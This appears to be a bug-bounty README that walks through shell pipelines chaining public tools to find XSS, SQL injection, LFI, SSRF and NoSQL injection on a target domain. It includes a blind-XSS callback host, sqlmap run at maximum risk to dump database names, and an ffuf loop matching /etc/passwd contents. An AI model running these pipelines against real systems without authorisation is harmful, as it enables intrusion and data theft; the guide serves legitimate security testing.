# AutomationGuide
Learn how to automate XSS, SSRF, LFI, SQLI, NoSQLi

## Tools needed for automation

* <a href="https://github.com/projectdiscovery/subfinder">Subfinder</a>
* <a href="https://github.com/projectdiscovery/httpx">httpx</a>
* <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a>
* <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a>
* <a href="https://github.com/hahwul/dalfox">dalfox</a>
* <a href="https://github.com/tomnomnom/qsreplace">qsreplace</a>
* <a href="https://github.com/ffuf/ffuf">ffuf</a>
* <a href="https://github.com/Charlie-belmer/nosqli">nosqli</a>
* <a href="https://github.com/tomnomnom/gf">gf</a>
* <a href="https://github.com/1ndianl33t/Gf-Patterns">Gf_Patterns</a>

## XSS automation 

You can automate XSS by the following steps:

**STEP 1**<br>

*Find the subdomains of the target:*

```
$ subfinder -d example.com | tee -a domains.txt
```
`-d` is to specify the target domain and `tee -a domains.txt` will save the output to a file.

**STEP 2**<br>
*Find the domains that are alive:*
```
$ cat domains.txt | httpx | tee urls.alive 
```
`cat domains.txt` will open the file and `httpx` will find the domains that are alive and `tee urls.alive` will save the output to a file.

**STEP 3**<br>
*Fetch known URLs from the Wayback Machine:*
```
$ cat urls.alive | waybackurls | tee wayback.urls
```
`cat urls.alive` will open the file and `waybackurls` will fetch the URLs from Wayback Machine and `tee wayback.urls` will save the output to a file. 

**STEP 4**<br>
*Find the XSS pattern URLs from wayback.urls:*
```
$ gf xss wayback.urls >> urls.xss
```
`gf xss` is to specify that you have to find the URLs that have XSS patterns from `wayback.urls` file and `>> urls.xss` will save the output to a file.

**STEP 5**<br>
*Find XSS using dalfox:*
```
$ dalfox -b hahwul.xss.ht file urls.xss
```
`-b` is to specify the blind XSS payload and `file urls.xss` is the file that contains XSS pattern URLs. 

## SQL injection automation
You can automate SQL injection by the following steps:

* NOTE: The steps are same as XSS upto STEP 3 

**STEP 4**<br>
*Find the SQLI pattern URLs from wayback.urls:*
```
$ gf sqli wayback.urls >> urls.sqli
```
`gf sqli` is to specify that you have to find the URLs that have SQLI patterns from `wayback.urls` file and `>> urls.sqli` will save the output to a file.

**STEP 5**<br>
*Find SQL injection using sqlmap*
```
$ sqlmap -m urls.sqli --level 5 --risk 3 --batch --dbs --tamper=between 
```
`-m` is to specify the multiple targets file which is `urls.sqli`, `--level 5` will increase the level of scanning and exploitation, `--risk 3` allows the type of payloads used by the tool. By default, it uses value 1 and can be configured up to `level 3`. Level 3, being the `maximum`, includes some `heavy SQL queries`. The level defines the number of `checks/payload` to be performed, `--batch` will automatically answer the Y/N questions, `--dbs` is to find all databases if the vulnerability exists and `--tamper` is to add a script.

## LFI automation
You scan automate LFI by this single command:
```
$ subfinder -d example.com | waybackurls | gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w payloads_wordlist.txt ; done
```
`subfinder -d example.com` will find the subdomains, `waybackurls` will fetch the URLs from wayback machine, `gf lfi` will find the lfi pattern URLs, `qsreplace` will replace the value after `=` to `FUZZ`, `while read url` is a while loop that will read the URLs and `ffuf -u $url -mr "root:x" -w payloads_wordlist.txt` will find the LFI vulnerability.    

## SSRF automation
You can automate SSRF by the following steps:

* NOTE: The steps are same as XSS upto STEP 3 

**STEP 4**<br>
*Find the SSRF pattern URLs from wayback.urls:*
```
$ gf ssrf wayback.urls >> urls.ssrf
```
`gf ssrf` is to specify that you have to find the URLs that have SSRF patterns from `wayback.urls` file and `>> urls.ssrf` will save the output to a file.

**STEP 5**<br>
*Replace the values after `=` to burp collaborator payload:*
```
$ cat urls.ssrf | qsreplace Burp collaborator payload >> ssrf.urls_ffuf
```

**STEP 6**
*Find ssrf using ffuf:*
```
$ ffuf -c -w ssrf.urls_ffuf -u FUZZ
```
`-w` is to specify the SSRF URLs and `-u` is to specify the URL.

Now check your burp collaborator if there is any execution.

## NoSQL injection automation
You can automate the NoSQL injection using nosqli tool:

*For example you found a URL like - `http://localhost:4000/user/lookup?=&username=test` so lets automate the process of exploitation*   
```
$ nosqli scan -t http://localhost:4000/user/lookup?username=test
```
`scan` is to start scanning on the target and `-t` is to specify the target. 

## Special thanks

A big thanks to all the developers who developed these amazing tools!




